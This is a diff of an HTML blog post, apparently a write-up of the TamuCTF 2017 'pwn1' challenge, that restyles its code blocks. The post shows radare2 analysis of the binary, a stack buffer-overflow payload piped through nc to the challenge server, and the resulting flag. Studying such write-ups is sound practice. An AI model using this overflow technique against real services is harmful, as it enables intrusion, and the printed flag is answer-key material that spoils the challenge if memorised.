@@ -88,42 +88,37 @@
 <p><img src="/images/TamuCTF2017/pwn1/1-pwn1_description.png" alt="Pwn1 Challenge Description" /></p>
 
 <p>We are told that there is a binary running remotely and its code is available to download. Lets download and open it with r2.</p>
-
-<pre><code class="language-bash">$ wget https://ctf.tamu.edu/files/7e968d03d9caa11a2f4f2909bd3cabc9/pwn1
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span></span>$ wget https://ctf.tamu.edu/files/7e968d03d9caa11a2f4f2909bd3cabc9/pwn1
 $ r2 pwn1
-</code></pre>
+</pre></div>
 
 <p>Now that the binary is opened, we need to analyze its content.</p>
-
-<pre><code class="language-bash">[0xf7721ac0]&gt; aaa		# Analyze
-[0xf7721ac0]&gt; afl		# List functions found
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span></span><span style="color: #f92672">[</span>0xf7721ac0<span style="color: #f92672">]</span>&gt; aaa		<span style="color: #75715e"># Analyze</span>
+<span style="color: #f92672">[</span>0xf7721ac0<span style="color: #f92672">]</span>&gt; afl		<span style="color: #75715e"># List functions found</span>
 .
 .
-0x0804854b    4 103          sym.print_flag
-0x080485b2    4 120          main
+0x0804854b    <span style="color: #ae81ff">4</span> <span style="color: #ae81ff">103</span>          sym.print_flag
+0x080485b2    <span style="color: #ae81ff">4</span> <span style="color: #ae81ff">120</span>          main
 .
 .
-</code></pre>
+</pre></div>
 
 <p>Interesting, there is <strong>print_flag</strong> function at <code>0x0804854b</code>. Lets see what&rsquo;s inside.</p>
-
-<pre><code class="language-bash">[0xf771eac0]&gt; s sym.print_flag	# We move to beginning of print_flag function
-[0x0804854b]&gt; pdf				# print its code
-</code></pre>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span></span><span style="color: #f92672">[</span>0xf771eac0<span style="color: #f92672">]</span>&gt; s sym.print_flag	<span style="color: #75715e"># We move to beginning of print_flag function</span>
+<span style="color: #f92672">[</span>0x0804854b<span style="color: #f92672">]</span>&gt; pdf				<span style="color: #75715e"># print its code</span>
+</pre></div>
 
 <p><img src="/images/TamuCTF2017/pwn1/2-pwn1_open_flag.png" alt="Pwn1 Open File Function" /></p>
 
 <p>Because of the offsets <code>0x08048569</code> and <code>0x0804856e</code> we can deduce that the function opens a file called <strong>flag.txt</strong> and prints its content. Fantastic :v:, so we just need to know who will call <strong>print_flag</strong>. This can be figured out through the <code>axt</code> command of r2 which stands for &ldquo;cross reference to&rdquo; the actual function.</p>
-
-<pre><code class="language-bash">[0x0804854b]&gt; axt
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span></span><span style="color: #f92672">[</span>0x0804854b<span style="color: #f92672">]</span>&gt; axt
 call 0x8048606 call sym.print_flag in main
-</code></pre>
+</pre></div>
 
 <p>Cool, so this function will be called from offset <code>0x8048606</code> <strong>main</strong>. Lets see whats inside it.</p>
-
-<pre><code class="language-bash">[0x0804854b]&gt; s main
-[0x080485b2]&gt; pdf
-</code></pre>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span></span><span style="color: #f92672">[</span>0x0804854b<span style="color: #f92672">]</span>&gt; s main
+<span style="color: #f92672">[</span>0x080485b2<span style="color: #f92672">]</span>&gt; pdf
+</pre></div>
 
 <p><img src="/images/TamuCTF2017/pwn1/3-pwn1_condition.png" alt="Pwn1 Condition" /></p>
 
@@ -141,12 +136,11 @@ call 0x8048606 call sym.print_flag in main
 Easy!</p>
 
 <p><code>($ebp - 0xC) - ($ebp - 0x27)  = 0x27 - 0xC = 0x1B = 27d</code> 27 Characters.</p>
-
-<pre><code class="language-bash">$ python -c 'print(&quot;A&quot;*27 + &quot;\x1E\xAB\x11\xCA&quot;)' | nc pwn.ctf.tamu.edu 4322
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span></span>$ python -c <span style="color: #e6db74">&#39;print(&quot;A&quot;*27 + &quot;\x1E\xAB\x11\xCA&quot;)&#39;</span> <span style="color: #f8f8f2">|</span> nc pwn.ctf.tamu.edu <span style="color: #ae81ff">4322</span>
 Enter the secret word:
 How did you figure out my secret?!
-gigem{T00_435Y}
-</code></pre>
+gigem<span style="color: #f92672">{</span>T00_435Y<span style="color: #f92672">}</span>
+</pre></div>
 
 <p>Answer: gigem{T00_435Y}</p>
 
